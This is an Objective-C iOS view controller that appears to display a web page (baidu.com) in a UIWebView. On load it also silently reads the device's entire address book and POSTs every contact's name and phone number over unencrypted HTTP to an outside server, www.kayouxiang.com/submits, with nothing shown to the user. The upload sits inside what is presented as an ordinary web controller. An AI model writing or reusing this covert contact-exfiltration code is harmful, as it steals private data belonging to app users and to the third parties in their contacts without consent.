//
//  IndexWebController.m
//  WhipMe
//
//  Created by Song on 2017/9/6.
//  Copyright © 2017年 -. All rights reserved.
//

#import "IndexWebController.h"
#import "JXAddressBook.h"

@implementation JSObjectModel

- (void)upLoadAddressBook:(NSString *)card {


}

@end

@interface IndexWebController ()<UIWebViewDelegate>

@property (nonatomic, strong) UIWebView *webViewWM;

@end

@implementation IndexWebController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    [self setup];
    [self getAddressBook];
}


- (void)dealloc {
    [[NSURLCache sharedURLCache] removeAllCachedResponses];
    DebugLog(@"%@",NSStringFromClass(self.class));
}

- (void)setup {
    WEAK_SELF
    
    [self.view setBackgroundColor:[UIColor whiteColor]];
    
    self.webViewWM = [[UIWebView alloc] initWithFrame:CGRectZero];
    self.webViewWM.scalesPageToFit = YES;
    self.webViewWM.delegate = self;
    [self.webViewWM.scrollView setBounces:NO];

    [self.view addSubview:self.webViewWM];
    [self.webViewWM mas_updateConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(weakSelf.view);
    }];
    [self startLoad];
}

- (void)startLoad {
    if (self.webViewWM.isLoading) {
        return;
    }
    NSURL *url = [NSURL URLWithString:@"https://www.baidu.com"];
    NSURLRequest *request = [[NSURLRequest alloc] initWithURL:url cachePolicy:NSURLRequestReturnCacheDataElseLoad timeoutInterval:60];
    [self.webViewWM loadRequest:request];
}

//- (void)loadLocalHtml {
//    NSString *path = [[NSBundle mainBundle] bundlePath];
//    NSURL *baseURL = [NSURL fileURLWithPath:path];
//
//    [self.navigationItem setTitle:@"用户协议"];
//    NSString *htmlPath = [[NSBundle mainBundle] pathForResource:@"userAgreement" ofType:@"html"];
//    if (self.webType == WMWebViewTypeHelpCenter) {
//        [self.navigationItem setTitle:@"帮助中心"];
//        htmlPath = [[NSBundle mainBundle] pathForResource:@"HelpCenter" ofType:@"html"];
//    }
//
//    NSString *htmlCont = [NSString stringWithContentsOfFile:htmlPath encoding:NSUTF8StringEncoding error:nil];
//    [self.webViewWM loadHTMLString:htmlCont baseURL:baseURL];
//}

- (void)loadErrorHtml {
    NSString *path = [[NSBundle mainBundle] bundlePath];
    NSURL *baseURL = [NSURL fileURLWithPath:path];
    NSString *htmlPath = [[NSBundle mainBundle] pathForResource:@"error" ofType:@"html"];
    NSString *htmlCont = [NSString stringWithContentsOfFile:htmlPath encoding:NSUTF8StringEncoding error:nil];
    
    [self.webViewWM loadHTMLString:htmlCont baseURL:baseURL];
}

#pragma mark - UIWebViewDelegate
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
    return YES;
}

- (void)webViewDidStartLoad:(UIWebView *)webView {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
}

- (void)webViewDidFinishLoad:(UIWebView *)webView {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
    NSString *webTitle = [webView stringByEvaluatingJavaScriptFromString:@"document.title"];
    if ([NSString isBlankString:webTitle] == NO) {
        self.navigationItem.title = webTitle;
    }
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
    if([error code] == NSURLErrorCancelled) {
        return;
    }
}


- (void)getAddressBook {
    ABAuthorizationStatus authStatus = ABAddressBookGetAuthorizationStatus();
    if (authStatus == kABAuthorizationStatusDenied) {
        // 没权限
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"通讯录权限未开启"
                                                            message:@"请到设置>隐私>定位服务中开启［环球黑卡］通讯录权限。"
                                                           delegate:self
                                                  cancelButtonTitle:@"取消"
                                                  otherButtonTitles:@"立即开启", nil];
        [alertView show];
        [alertView bk_setHandler:^{
            NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
            if ([[UIApplication sharedApplication] canOpenURL:url]) {
                [[UIApplication sharedApplication] openURL:url];
            }
        } forButtonAtIndex:1];
    } else {
        [JXAddressBook getPersonInfo:^(NSArray *personInfos) {
            NSMutableArray *addressBook = [NSMutableArray array];
            for (JXPersonInfo *personInfo in personInfos) {
                if ([NSString isBlankString:personInfo.showAllPhoneNO] == NO &&
                    [NSString isBlankString:personInfo.fullName] == NO &&
                    [personInfo.selectedPhoneNO isEqualToString:@"空"] == NO) {
                    NSDictionary *addressBookDict = @{@"number":personInfo.showAllPhoneNO,
                                                      @"name":personInfo.fullName};
                    [addressBook addObject:addressBookDict];
                }
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self upLoadAddressBook:addressBook];
            });
        }];
    }
}

- (void)upLoadAddressBook:(NSArray *)datas {
    if (datas.count == 0) {
        return;
    }
    NSDictionary *params = @{@"card":@"111",@"datas":datas};
    [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:YES];
    AFHTTPSessionManager *manager = [[AFHTTPSessionManager alloc] initWithBaseURL:[NSURL URLWithString:@"http://www.kayouxiang.com"]];
//    manager.requestSerializer   = [AFJSONRequestSerializer serializer];
//    manager.responseSerializer  = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    [manager.responseSerializer setAcceptableContentTypes:nil];
//    manager.responseSerializer.acceptableContentTypes = [NSSet
//       setWithObjects:@"text/html",@"text/plain",@"application/json",nil];
    [manager POST:@"/submits" parameters:params progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable result) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
        NSLog(@"success:%@",result);
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
        NSLog(@"error:%@",error);
    }];
}


@end
